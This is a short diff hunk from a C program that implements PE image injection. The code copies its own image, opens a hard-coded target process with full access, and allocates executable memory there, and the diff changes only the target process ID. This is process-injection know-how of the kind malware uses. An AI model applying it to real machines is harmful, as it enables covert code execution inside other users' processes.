@@ -44,7 +44,7 @@ int main()
 	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
 
 	// Open the target process
-	HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 336);
+	HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1172);
 	// Allocate memory in the target process
 	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	// Calculate delta
